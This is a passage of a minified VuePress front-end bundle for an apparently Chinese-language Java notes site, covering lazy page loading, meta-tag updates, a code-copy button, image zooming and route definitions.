t.e(21).then(t.bind(null,497))},"v-5ae2093a":function(){return t.e(22).then(t.bind(null,498))},"v-c1fddfba":function(){return t.e(24).then(t.bind(null,499))},"v-585fb790":function(){return t.e(19).then(t.bind(null,500))},"v-747c7e31":function(){return t.e(25).then(t.bind(null,501))},"v-1b2fbd05":function(){return t.e(23).then(t.bind(null,502))},"v-394fe5d6":function(){return t.e(26).then(t.bind(null,503))},"v-ff2741c6":function(){return t.e(27).then(t.bind(null,504))},"v-5cc7fa15":function(){return t.e(28).then(t.bind(null,505))},"v-6ae9c5a4":function(){return t.e(30).then(t.bind(null,506))},"v-7ee2cada":function(){return t.e(29).then(t.bind(null,507))},"v-e7b7c32a":function(){return t.e(31).then(t.bind(null,508))},"v-9905be46":function(){return t.e(32).then(t.bind(null,509))},"v-808a2772":function(){return t.e(33).then(t.bind(null,510))},"v-3002ba14":function(){return t.e(34).then(t.bind(null,511))},"v-02fdbe47":function(){return t.e(37).then(t.bind(null,512))},"v-23c6095a":function(){return t.e(35).then(t.bind(null,513))},"v-1527c6e0":function(){return t.e(36).then(t.bind(null,514))},"v-07e31ee4":function(){return t.e(38).then(t.bind(null,515))},"v-d16f8084":function(){return t.e(40).then(t.bind(null,516))},"v-2c7a2efa":function(){return t.e(39).then(t.bind(null,517))},"v-6b4bcf80":function(){return t.e(41).then(t.bind(null,518))},"v-1acf6d1d":function(){return t.e(42).then(t.bind(null,519))},"v-63ccbaf9":function(){return t.e(43).then(t.bind(null,520))},"v-25d7f92e":function(){return t.e(44).then(t.bind(null,521))},"v-7bea548f":function(){return t.e(45).then(t.bind(null,522))},"v-f97f0090":function(){return t.e(46).then(t.bind(null,523))},"v-0e7babe4":function(){return t.e(47).then(t.bind(null,524))},"v-5ad0f62c":function(){return t.e(48).then(t.bind(null,525))},"v-4542ff7e":function(){return t.e(49).then(t.bind(null,526))},"v-3ef166c4":function(){return t.e(50).then(t.bind(null,527))},"v-3d328794":function(){return t.e(51).then(t.bind(null,528))},"v-38452f23":function(){return t.e(52).then(t.bind(null,529))},"v-2674598f":function(){return t.e(53).then(t.bind(null,530))},"v-72fa657c":function(){return t.e(55).then(t.bind(null,531))},"v-4b5e3128":function(){return t.e(54).then(t.bind(null,532))},"v-dcb32594":function(){return t.e(58).then(t.bind(null,533))},"v-21786cb6":function(){return t.e(56).then(t.bind(null,534))},"v-d6189198":function(){return t.e(57).then(t.bind(null,535))},"v-082b0d2c":function(){return t.e(59).then(t.bind(null,536))},"v-eca50964":function(){return t.e(60).then(t.bind(null,537))},"v-5ff80878":function(){return t.e(62).then(t.bind(null,538))},"v-5c71f4fa":function(){return t.e(61).then(t.bind(null,539))},"v-146c1cb3":function(){return t.e(64).then(t.bind(null,540))},"v-315575a6":function(){return t.e(63).then(t.bind(null,541))},"v-727d91d9":function(){return t.e(65).then(t.bind(null,542))},"v-44194b63":function(){return t.e(66).then(t.bind(null,543))},"v-5b4e4ae2":function(){return t.e(67).then(t.bind(null,544))},"v-e5da1462":function(){return t.e(68).then(t.bind(null,545))},"v-4fb47c6c":function(){return t.e(69).then(t.bind(null,546))},"v-1b92a67a":function(){return t.e(70).then(t.bind(null,547))},"v-a652ea48":function(){return t.e(71).then(t.bind(null,548))},"v-8194159c":function(){return t.e(73).then(t.bind(null,549))},"v-4993606a":function(){return t.e(72).then(t.bind(null,550))},"v-066dd738":function(){return t.e(74).then(t.bind(null,551))},"v-4fbe8f80":function(){return t.e(75).then(t.bind(null,552))},"v-008f5f06":function(){return t.e(76).then(t.bind(null,553))},"v-827e00c2":function(){return t.e(77).then(t.bind(null,554))},"v-775a7bcf":function(){return t.e(80).then(t.bind(null,555))},"v-5108785a":function(){return t.e(79).then(t.bind(null,556))},"v-52c117a4":function(){return t.e(78).then(t.bind(null,557))},"v-5e7029de":function(){return t.e(81).then(t.bind(null,558))},"v-d0de8634":function(){return t.e(82).then(t.bind(null,559))},"v-909b2404":function(){return t.e(83).then(t.bind(null,560))},"v-64e25eba":function(){return t.e(84).then(t.bind(null,561))},"v-4e70a85e":function(){return t.e(85).then(t.bind(null,562))},"v-7d0dc8ff":function(){return t.e(87).then(t.bind(null,563))},"v-2ae3d180":function(){return t.e(86).then(t.bind(null,564))},"v-2df2013e":function(){return t.e(88).then(t.bind(null,565))},"v-f2dce1b0":function(){return t.e(89).then(t.bind(null,566))},"v-966f9b00":function(){return t.e(90).then(t.bind(null,567))},"v-212cb943":function(){return t.e(91).then(t.bind(null,568))},"v-80701660":function(){return t.e(92).then(t.bind(null,569))},"v-1cf8c197":function(){return t.e(93).then(t.bind(null,570))},"v-be3913a8":function(){return t.e(94).then(t.bind(null,571))},"v-589af7a8":function(){return t.e(95).then(t.bind(null,572))},"v-c4504aa6":function(){return t.e(96).then(t.bind(null,573))},"v-1bd8b602":function(){return t.e(97).then(t.bind(null,574))},"v-4af5aed9":function(){return t.e(98).then(t.bind(null,575))},"v-145b2bd8":function(){return t.e(100).then(t.bind(null,576))},"v-3701b2bc":function(){return t.e(99).then(t.bind(null,577))},"v-2715e687":function(){return t.e(101).then(t.bind(null,578))},"v-3a5a1361":function(){return t.e(102).then(t.bind(null,579))},"v-40ab9df5":function(){return t.e(103).then(t.bind(null,580))},"v-59de6d20":function(){return t.e(104).then(t.bind(null,581))}};function Ci(n){var e=Object.create(null);return function(t){return e[t]||(e[t]=n(t))}}var Pi=/-(\w)/g,Ri=Ci((function(n){return n.replace(Pi,(function(n,e){return e?e.toUpperCase():""}))})),Bi=/\B([A-Z])/g,Oi=Ci((function(n){return n.replace(Bi,"-$1").toLowerCase()})),zi=Ci((function(n){return n.charAt(0).toUpperCase()+n.slice(1)}));function Mi(n,e){if(e)return n(e)?n(e):e.includes("-")?n(zi(Ri(e))):n(zi(e))||n(Oi(e))}var Li=Object.assign({},_i,Ii),Di=function(n){return Li[n]},Ni=function(n){return Ii[n]},qi=function(n){return _i[n]},Fi=function(n){return Ba.component(n)};function $i(n){return Mi(Ni,n)}function Ui(n){return Mi(qi,n)}function Gi(n){return Mi(Di,n)}function Ji(n){return Mi(Fi,n)}function Vi(){for(var n=arguments.length,e=new Array(n),t=0;t<n;t++)e[t]=arguments[t];return Promise.all(e.filter((function(n){return n})).map(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(e){var t;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(Ji(e)||!Gi(e)){n.next=5;break}return n.next=3,Gi(e)();case 3:t=n.sent,Ba.component(e,t.default);case 5:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}()))}function Hi(n,e){"undefined"!=typeof window&&window.__VUEPRESS__&&(window.__VUEPRESS__[n]=e)}var Ki=t(50),Wi=(t(274),t(156),t(51),t(221)),Xi=t.n(Wi),Yi=t(222),Qi=t.n(Yi),Zi={created:function(){if(this.siteMeta=this.$site.headTags.filter((function(n){return"meta"===Object(Ki.a)(n,1)[0]})).map((function(n){var e=Object(Ki.a)(n,2);e[0];return e[1]})),this.$ssrContext){var n=this.getMergedMetaTags();this.$ssrContext.title=this.$title,this.$ssrContext.lang=this.$lang,this.$ssrContext.pageMeta=(e=n)?e.map((function(n){var e="<meta";return Object.keys(n).forEach((function(t){e+=" ".concat(t,'="').concat(Qi()(n[t]),'"')})),e+">"})).join("\n    "):"",this.$ssrContext.canonicalLink=es(this.$canonicalUrl)}var e},mounted:function(){this.currentMetaTags=Object(Ti.a)(document.querySelectorAll("meta")),this.updateMeta(),this.updateCanonicalLink()},methods:{updateMeta:function(){document.title=this.$title,document.documentElement.lang=this.$lang;var n=this.getMergedMetaTags();this.currentMetaTags=ts(n,this.currentMetaTags)},getMergedMetaTags:function(){var n=this.$page.frontmatter.meta||[];return Xi()([{name:"description",content:this.$description}],n,this.siteMeta,rs)},updateCanonicalLink:function(){ns(),this.$canonicalUrl&&document.head.insertAdjacentHTML("beforeend",es(this.$canonicalUrl))}},watch:{$page:function(){this.updateMeta(),this.updateCanonicalLink()}},beforeDestroy:function(){ts(null,this.currentMetaTags),ns()}};function ns(){var n=document.querySelector("link[rel='canonical']");n&&n.remove()}function es(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"";return n?'<link href="'.concat(n,'" rel="canonical" />'):""}function ts(n,e){if(e&&Object(Ti.a)(e).filter((function(n){return n.parentNode===document.head})).forEach((function(n){return document.head.removeChild(n)})),n)return n.map((function(n){var e=document.createElement("meta");return Object.keys(n).forEach((function(t){e.setAttribute(t,n[t])})),document.head.appendChild(e),e}))}function rs(n){for(var e=0,t=["name","property","itemprop"];e<t.length;e++){var r=t[e];if(n.hasOwnProperty(r))return n[r]+r}return JSON.stringify(n)}t(149);var as=t(157),os={mounted:function(){window.addEventListener("scroll",this.onScroll)},methods:{onScroll:t.n(as)()((function(){this.setActiveHash()}),300),setActiveHash:function(){for(var n=this,e=[].slice.call(document.querySelectorAll(".sidebar-link")),t=[].slice.call(document.querySelectorAll(".header-anchor")).filter((function(n){return e.some((function(e){return e.hash===n.hash}))})),r=Math.max(window.pageYOffset,document.documentElement.scrollTop,document.body.scrollTop),a=Math.max(document.documentElement.scrollHeight,document.body.scrollHeight),o=window.innerHeight+r,i=0;i<t.length;i++){var s=t[i],l=t[i+1],c=0===i&&0===r||r>=s.parentElement.offsetTop+10&&(!l||r<l.parentElement.offsetTop-10),p=decodeURIComponent(this.$route.hash);if(c&&p!==decodeURIComponent(s.hash)){var d=s;if(o===a)for(var u=i+1;u<t.length;u++)if(p===decodeURIComponent(t[u].hash))return;return this.$vuepress.$set("disableScrollBehavior",!0),void this.$router.replace(decodeURIComponent(d.hash),(function(){n.$nextTick((function(){n.$vuepress.$set("disableScrollBehavior",!1)}))}))}}}},beforeDestroy:function(){window.removeEventListener("scroll",this.onScroll)}},is=(t(58),t(109)),ss=t.n(is),ls={mounted:function(){var n=this;ss.a.configure({showSpinner:!1}),this.$router.beforeEach((function(n,e,t){n.path===e.path||Ba.component(n.name)||ss.a.start(),t()})),this.$router.afterEach((function(){ss.a.done(),n.isSidebarOpen=!1}))}};t(80),t(110),t(83),t(369);function cs(n,e){if(!(n instanceof e))throw new TypeError("Cannot call a class as a function")}t(105);function ps(n,e){for(var t=0;t<e.length;t++){var r=e[t];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(n,r.key,r)}}function ds(n,e,t){return e&&ps(n.prototype,e),t&&ps(n,t),Object.defineProperty(n,"prototype",{writable:!1}),n}t(370);var us=function(){function n(){cs(this,n);this.containerEl=document.getElementById("message-container"),this.containerEl||(this.containerEl=document.createElement("div"),this.containerEl.id="message-container",document.body.appendChild(this.containerEl))}return ds(n,[{key:"show",value:function(n){var e=this,t=n.text,r=void 0===t?"":t,a=n.duration,o=void 0===a?3e3:a,i=document.createElement("div");i.className="message move-in",i.innerHTML='\n      <i style="fill: #06a35a;font-size: 14px;display:inline-flex;align-items: center;">\n        <svg style="fill: #06a35a;font-size: 14px;" t="1572421810237" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2323" width="16" height="16"><path d="M822.811993 824.617989c-83.075838 81.99224-188.546032 124.613757-316.049383 127.86455-122.085362-3.250794-223.943563-45.87231-305.935802-127.86455s-124.613757-184.21164-127.86455-305.935802c3.250794-127.503351 45.87231-232.973545 127.86455-316.049383 81.99224-83.075838 184.21164-126.058554 305.935802-129.309347 127.503351 3.250794 232.973545 46.23351 316.049383 129.309347 83.075838 83.075838 126.058554 188.546032 129.309347 316.049383C949.231746 640.406349 905.887831 742.62575 822.811993 824.617989zM432.716755 684.111464c3.973192 3.973192 8.307584 5.779189 13.364374 6.140388 5.05679 0.361199 9.752381-1.444797 13.364374-5.417989l292.571429-287.514638c3.973192-3.973192 5.779189-8.307584 5.779189-13.364374 0-5.05679-1.805996-9.752381-5.779189-13.364374l1.805996 1.805996c-3.973192-3.973192-8.668783-5.779189-14.086772-6.140388-5.417989-0.361199-10.47478 1.444797-14.809171 5.417989l-264.397884 220.33157c-3.973192 3.250794-8.668783 4.695591-14.447972 4.695591-5.779189 0-10.835979-1.444797-15.53157-3.973192l-94.273016-72.962257c-4.334392-3.250794-9.391182-4.334392-14.447972-3.973192s-9.391182 3.250794-12.641975 7.585185l-2.889594 3.973192c-3.250794 4.334392-4.334392 9.391182-3.973192 14.809171 0.722399 5.417989 2.528395 10.11358 5.779189 14.086772L432.716755 684.111464z" p-id="2324"></path></svg>\n      </i>\n      <div class="text">'.concat(r,"</div>\n    "),this.containerEl.appendChild(i),o>0&&setTimeout((function(){e.close(i)}),o)}},{key:"close",value:function(n){n.className=n.className.replace("move-in",""),n.className+="move-out",n.addEventListener("animationend",(function(){n.remove()}))}}]),n}(),ms={mounted:function(){!!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)||this.updateCopy()},updated:function(){!!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)||this.updateCopy()},methods:{updateCopy:function(){var n=this;setTimeout((function(){(['div[class*="language-"] pre','div[class*="aside-code"] aside']instanceof Array||Array.isArray(['div[class*="language-"] pre','div[class*="aside-code"] aside']))&&['div[class*="language-"] pre','div[class*="aside-code"] aside'].forEach((function(e){document.querySelectorAll(e).forEach(n.generateCopyButton)}))}),1e3)},generateCopyButton:function(n){var e=this;if(!n.classList.contains("codecopy-enabled")){var t=document.createElement("i");t.className="code-copy",t.innerHTML='<svg  style="color:#aaa;font-size:14px" t="1572422231464" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="3201" width="14" height="14"><path d="M866.461538 39.384615H354.461538c-43.323077 0-78.769231 35.446154-78.76923 78.769231v39.384616h472.615384c43.323077 0 78.769231 35.446154 78.769231 78.76923v551.384616h39.384615c43.323077 0 78.769231-35.446154 78.769231-78.769231V118.153846c0-43.323077-35.446154-78.769231-78.769231-78.769231z m-118.153846 275.692308c0-43.323077-35.446154-78.769231-78.76923-78.769231H157.538462c-43.323077 0-78.769231 35.446154-78.769231 78.769231v590.769231c0 43.323077 35.446154 78.769231 78.769231 78.769231h512c43.323077 0 78.769231-35.446154 78.76923-78.769231V315.076923z m-354.461538 137.846154c0 11.815385-7.876923 19.692308-19.692308 19.692308h-157.538461c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h157.538461c11.815385 0 19.692308 7.876923 19.692308 19.692308v39.384615z m157.538461 315.076923c0 11.815385-7.876923 19.692308-19.692307 19.692308H216.615385c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h315.076923c11.815385 0 19.692308 7.876923 19.692307 19.692308v39.384615z m78.769231-157.538462c0 11.815385-7.876923 19.692308-19.692308 19.692308H216.615385c-11.815385 0-19.692308-7.876923-19.692308-19.692308v-39.384615c0-11.815385 7.876923-19.692308 19.692308-19.692308h393.846153c11.815385 0 19.692308 7.876923 19.692308 19.692308v39.384615z" p-id="3202"></path></svg>',t.title="Copy to clipboard",t.addEventListener("click",(function(){e.copyToClipboard(n.innerText)})),n.appendChild(t),n.classList.add("codecopy-enabled")}},copyToClipboard:function(n){var e=document.createElement("textarea");e.value=n,e.setAttribute("readonly",""),e.style.position="absolute",e.style.left="-9999px",document.body.appendChild(e);var t=document.getSelection().rangeCount>0&&document.getSelection().getRangeAt(0);e.select(),document.execCommand("copy"),(new us).show({text:"å¤å¶æå",duration:1e3}),document.body.removeChild(e),t&&(document.getSelection().removeAllRanges(),document.getSelection().addRange(t))}}},gs=(t(79),"auto"),fs="zoom-in",hs="zoom-out",bs="grab",vs="move";function ys(n,e,t){var r=!(arguments.length>3&&void 0!==arguments[3])||arguments[3],a={passive:!1};r?n.addEventListener(e,t,a):n.removeEventListener(e,t,a)}function ks(n,e){if(n){var t=new Image;t.onload=function(){e&&e(t)},t.src=n}}function xs(n){return n.dataset.original?n.dataset.original:"A"===n.parentNode.tagName?n.parentNode.getAttribute("href"):null}function ws(n,e,t){!function(n){var e=Ss,t=js;if(n.transition){var r=n.transition;delete n.transition,n[e]=r}if(n.transform){var a=n.transform;delete n.transform,n[t]=a}}(e);var r=n.style,a={};for(var o in e)t&&(a[o]=r[o]||""),r[o]=e[o];return a}var Ss="transition",js="transform",Es="transform",As="transitionend";var Ts=function(){},_s={enableGrab:!0,preloadImage:!1,closeOnWindowResize:!0,transitionDuration:.4,transitionTimingFunction:"cubic-bezier(0.4, 0, 0, 1)",bgColor:"rgb(255, 255, 255)",bgOpacity:1,scaleBase:1,scaleExtra:.5,scrollThreshold:40,zIndex:998,customSize:null,onOpen:Ts,onClose:Ts,onGrab:Ts,onMove:Ts,onRelease:Ts,onBeforeOpen:Ts,onBeforeClose:Ts,onBeforeGrab:Ts,onBeforeRelease:Ts,onImageLoading:Ts,onImageLoaded:Ts},Is={init:function(n){var e,t;e=this,t=n,Object.getOwnPropertyNames(Object.getPrototypeOf(e)).forEach((function(n){e[n]=e[n].bind(t)}))},click:function(n){if(n.preventDefault(),Ps(n))return window.open(this.target.srcOriginal||n.currentTarget.src,"_blank");this.shown?this.released?this.close():this.release():this.open(n.currentTarget)},scroll:function(){var n=document.documentElement||document.body.parentNode||document.body,e=window.pageXOffset||n.scrollLeft,t=window.pageYOffset||n.scrollTop;null===this.lastScrollPosition&&(this.lastScrollPosition={x:e,y:t});var r=this.lastScrollPosition.x-e,a=this.lastScrollPosition.y-t,o=this.options.scrollThreshold;(Math.abs(a)>=o||Math.abs(r)>=o)&&(this.lastScrollPosition=null,this.close())},keydown:function(n){(function(n){return"Escape"===(n.key||n.code)||27===n.keyCode})(n)&&(this.released?this.close():this.release(this.close))},mousedown:function(n){if(Cs(n)&&!Ps(n)){n.preventDefault();var e=n.clientX,t=n.clientY;this.pressTimer=setTimeout(function(){this.grab(e,t)}.bind(this),200)}},mousemove:function(n){this.released||this.move(n.clientX,n.clientY)},mouseup:function(n){Cs(n)&&!Ps(n)&&(clearTimeout(this.pressTimer),this.released?this.close():this.release())},touchstart:function(n){n.preventDefault();var e=n.touches[0],t=e.clientX,r=e.clientY;this.pressTimer=setTimeout(function(){this.grab(t,r)}.bind(this),200)},touchmove:function(n){if(!this.released){var e=n.touches[0],t=e.clientX,r=e.clientY;this.move(t,r)}},touchend:function(n){(function(n){n.targetTouches.length})(n)||(clearTimeout(this.pressTimer),this.released?this.close():this.release())},clickOverlay:function(){this.close()},resizeWindow:function(){this.close()}};function Cs(n){return 0===n.button}function Ps(n){return n.metaKey||n.ctrlKey}var Rs={init:function(n){this.el=document.createElement("div"),this.instance=n,this.parent=document.body,ws(this.el,{position:"fixed",top:0,left:0,right:0,bottom:0,opacity:0}),this.updateStyle(n.options),ys(this.el,"click",n.handler.clickOverlay.bind(n))},updateStyle:function(n){ws(this.el,{zIndex:n.zIndex,backgroundColor:n.bgColor,transition:"opacity\n        "+n.transitionDuration+"s\n        "+n.transitionTimingFunction})},insert:function(){this.parent.appendChild(this.el)},remove:function(){this.parent.removeChild(this.el)},fadeIn:function(){this.el.offsetWidth,this.el.style.opacity=this.instance.options.bgOpacity},fadeOut:function(){this.el.style.opacity=0}},Bs="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},Os=function(){function n(n,e){for(var t=0;t<e.length;t++){var r=e[t];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(n,r.key,r)}}return function(e,t,r){return t&&n(e.prototype,t),r&&n(e,r),e}}(),zs=Object.assign||function(n){for(var e=1;e<arguments.length;e++){var t=arguments[e];for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&(n[r]=t[r])}return n},Ms={init:function(n,e){this.el=n,this.instance=e,this.srcThumbnail=this.el.getAttribute("src"),this.srcset=this.el.getAttribute("srcset"),this.srcOriginal=xs(this.el),this.rect=this.el.getBoundingClientRect(),this.translate=null,this.scale=null,this.styleOpen=null,this.styleClose=null},zoomIn:function(){var n=this.instance.options,e=n.zIndex,t=n.enableGrab,r=n.transitionDuration,a=n.transitionTimingFunction;this.translate=this.calculateTranslate(),this.scale=this.calculateScale(),this.styleOpen={position:"relative",zIndex:e+1,cursor:t?bs:hs,transition:Es+"\n        "+r+"s\n        "+a,transform:"translate3d("+this.translate.x+"px, "+this.translate.y+"px, 0px)\n        scale("+this.scale.x+","+this.scale.y+")",height:this.rect.height+"px",width:this.rect.width+"px"},this.el.offsetWidth,this.styleClose=ws(this.el,this.styleOpen,!0)},zoomOut:function(){this.el.offsetWidth,ws(this.el,{transform:"none"})},grab:function(n,e,t){var r=Ls(),a=r.x-n,o=r.y-e;ws(this.el,{cursor:vs,transform:"translate3d(\n        "+(this.translate.x+a)+"px, "+(this.translate.y+o)+"px, 0px)\n        scale("+(this.scale.x+t)+","+(this.scale.y+t)+")"})},move:function(n,e,t){var r=Ls(),a=r.x-n,o=r.y-e;ws(this.el,{transition:Es,transform:"translate3d(\n        "+(this.translate.x+a)+"px, "+(this.translate.y+o)+"px, 0px)\n        scale("+(this.scale.x+t)+","+(this.scale.y+t)+")"})},restoreCloseStyle:function(){ws(this.el,this.styleClose)},restoreOpenStyle:function(){ws(this.el,this.styleOpen)},upgradeSource:function(){if(this.srcOriginal){var n=this.el.parentNode;this.srcset&&this.el.removeAttribute("srcset");var e=this.el.cloneNode(!1);e.setAttribute("src",this.srcOriginal),e.style.position="fixed",e.style.visibility="hidden",n.appendChild(e),setTimeout(function(){this.el.setAttribute("src",this.srcOriginal),n.removeChild(e)}.bind(this),50)}},downgradeSource:function(){this.srcOriginal&&(this.srcset&&this.el.setAttribute("srcset",this.srcset),this.el.setAttribute("src",this.srcThumbnail))},calculateTranslate:function(){var n=Ls(),e=this.rect.left+this.rect.width/2,t=this.rect.top+this.rect.height/2;return{x:n.x-e,y:n.y-t}},calculateScale:function(){var n=this.el.dataset,e=n.zoomingHeight,t=n.zoomingWidth,r=this.instance.options,a=r.customSize,o=r.scaleBase;if(!a&&e&&t)return{x:t/this.rect.width,y:e/this.rect.height};if(a&&"object"===(void 0===a?"undefined":Bs(a)))return{x:a.width/this.rect.width,y:a.height/this.rect.height};var i=this.rect.width/2,s=this.rect.height/2,l=Ls(),c={x:l.x-i,y:l.y-s},p=c.x/i,d=c.y/s,u=o+Math.min(p,d);if(a&&"string"==typeof a){var m=t||this.el.naturalWidth,g=e||this.el.naturalHeight,f=parseFloat(a)*m/(100*this.rect.width),h=parseFloat(a)*g/(100*this.rect.height);if(u>f||u>h)return{x:f,y:h}}return{x:u,y:u}}};function Ls(){var n=document.documentElement;return{x:Math.min(n.clientWidth,window.innerWidth)/2,y:Math.min(n.clientHeight,window.innerHeight)/2}}function Ds(n,e,t){["mousedown","mousemove","mouseup","touchstart","touchmove","touchend"].forEach((function(r){ys(n,r,e[r],t)}))}var Ns=function(){function n(e){!function(n,e){if(!(n instanceof e))throw new TypeError("Cannot call a class as a function")}(this,n),this.target=Object.create(Ms),this.overlay=Object.create(Rs),this.handler=Object.create(Is),this.body=document.body,this.shown=!1,this.lock=!1,this.released=!0,this.lastScrollPosition=null,this.pressTimer=null,this.options=zs({},_s,e),this.overlay.init(this),this.handler.init(this)}return Os(n,[{key:"listen",value:function(n){if("string"==typeof n)for(var e=document.querySelectorAll(n),t=e.length;t--;)this.listen(e[t]);else"IMG"===n.tagName&&(n.style.cursor=fs,ys(n,"click",this.handler.click),this.options.preloadImage&&ks(xs(n)));return this}},{key:"config",value:function(n){return n?(zs(this.options,n),this.overlay.updateStyle(this.options),this):this.options}},{key:"open",value:function(n){var e=this,t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:this.options.onOpen;if(!this.shown&&!this.lock){var r="string"==typeof n?document.querySelector(n):n;if("IMG"===r.tagName){if(this.options.onBeforeOpen(r),this.target.init(r,this),!this.options.preloadImage){var a=this.target.srcOriginal;null!=a&&(this.options.onImageLoading(r),ks(a,this.options.onImageLoaded))}this.shown=!0,this.lock=!0,this.target.zoomIn(),this.overlay.insert(),this.overlay.fadeIn(),ys(document,"scroll",this.handler.scroll),ys(document,"keydown",this.handler.keydown),this.options.closeOnWindowResize&&ys(window,"resize",this.handler.resizeWindow);var o=function n(){ys(r,As,n,!1),e.lock=!1,e.target.upgradeSource(),e.options.enableGrab&&Ds(document,e.handler,!0),t(r)};return ys(r,As,o),this}}}},{key:"close",value:function(){var n=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:this.options.onClose;if(this.shown&&!this.lock){var t=this.target.el;this.options.onBeforeClose(t),this.lock=!0,this.body.style.cursor=gs,this.overlay.fadeOut(),this.target.zoomOut(),ys(document,"scroll",this.handler.scroll,!1),ys(document,"keydown",this.handler.keydown,!1),this.options.closeOnWindowResize&&ys(window,"resize",this.handler.resizeWindow,!1);var r=function r(){ys(t,As,r,!1),n.shown=!1,n.lock=!1,n.target.downgradeSource(),n.options.enableGrab&&Ds(document,n.handler,!1),n.target.restoreCloseStyle(),n.overlay.remove(),e(t)};return ys(t,As,r),this}}},{key:"grab",value:function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:this.options.scaleExtra,r=arguments.length>3&&void 0!==arguments[3]?arguments[3]:this.options.onGrab;if(this.shown&&!this.lock){var a=this.target.el;this.options.onBeforeGrab(a),this.released=!1,this.target.grab(n,e,t);var o=function n(){ys(a,As,n,!1),r(a)};return ys(a,As,o),this}}},{key:"move",value:function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:this.options.scaleExtra,r=arguments.length>3&&void 0!==arguments[3]?arguments[3]:this.options.onMove;if(this.shown&&!this.lock){this.released=!1,this.body.style.cursor=vs,this.target.move(n,e,t);var a=this.target.el,o=function n(){ys(a,As,n,!1),r(a)};return ys(a,As,o),this}}},{key:"release",value:function(){var n=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:this.options.onRelease;if(this.shown&&!this.lock){var t=this.target.el;this.options.onBeforeRelease(t),this.lock=!0,this.body.style.cursor=gs,this.target.restoreOpenStyle();var r=function r(){ys(t,As,r,!1),n.lock=!1,n.released=!0,e(t)};return ys(t,As,r),this}}}]),n}(),qs=".theme-vdoing-content img:not(.no-zoom)",Fs=JSON.parse('{"bgColor":"rgba(0,0,0,0.6)"}'),$s=Number("500"),Us=function(){function n(){cs(this,n),this.instance=new Ns(Fs)}return ds(n,[{key:"update",value:function(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:qs;"undefined"!=typeof window&&this.instance.listen(n)}},{key:"updateDelay",value:function(){var n=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:qs,t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:$s;setTimeout((function(){return n.update(e)}),t)}}]),n}(),Gs=[Zi,os,ls,ms,{watch:{"$page.path":function(){void 0!==this.$vuepress.zooming&&this.$vuepress.zooming.updateDelay()}},mounted:function(){this.$vuepress.zooming=new Us,this.$vuepress.zooming.updateDelay()}}],Js={name:"GlobalLayout",computed:{layout:function(){var n=this.getLayout();return Hi("layout",n),Ba.component(n)}},methods:{getLayout:function(){if(this.$page.path){var n=this.$page.frontmatter.layout;return n&&(this.$vuepress.getLayoutAsyncComponent(n)||this.$vuepress.getVueComponent(n))?n:"Layout"}return"NotFound"}}},Vs=t(41),Hs=Object(Vs.a)(Js,(function(){var n=this.$createElement;return(this._self._c||n)(this.layout,{tag:"component"})}),[],!1,null,null,null).exports;!function(n,e,t){var r;switch(e){case"components":n[e]||(n[e]={}),Object.assign(n[e],t);break;case"mixins":n[e]||(n[e]=[]),(r=n[e]).push.apply(r,Object(Ti.a)(t));break;default:throw new Error("Unknown option name.")}}(Hs,"mixins",Gs);var Ks=[{name:"v-2dd0fd66",path:"/language/java/base/1/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-2dd0fd66").then(t)}},{path:"/language/java/base/1/index.html",redirect:"/language/java/base/1/"},{path:"/00.è¯­è¨/01.JAVA/01.åºç¡/1.JAVA é å çº¿ç¨.html",redirect:"/language/java/base/1/"},{name:"v-182bbd6a",path:"/language/java/version/1/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-182bbd6a").then(t)}},{path:"/language/java/version/1/index.html",redirect:"/language/java/version/1/"},{path:"/00.è¯­è¨/01.JAVA/03.çæ¬/1.JAVA8 æ°ç¹æ§æ»ç».html",redirect:"/language/java/version/1/"},{name:"v-43985582",path:"/language/java/base/2/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-43985582").then(t)}},{path:"/language/java/base/2/index.html",redirect:"/language/java/base/2/"},{path:"/00.è¯­è¨/01.JAVA/01.åºç¡/2.JAVA NIO API.html",redirect:"/language/java/base/2/"},{name:"v-26d5b34d",path:"/language/java/jvm/1/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-26d5b34d").then(t)}},{path:"/language/java/jvm/1/index.html",redirect:"/language/java/jvm/1/"},{path:"/00.è¯­è¨/01.JAVA/02.JVM/1.JVMæ¨¡åä»ç».html",redirect:"/language/java/jvm/1/"},{name:"v-1177a00b",path:"/language/java/version/2/",component:Hs,beforeEnter:function(n,e,t){Vi("Layout","v-1177a00b").then(t)}},{path:"/language/java/version/2/index.html",redirect:"/language/java/version/2/"},{path:"/00.è¯­è¨/01.JAVA/03.çæ¬/2.JAVA9 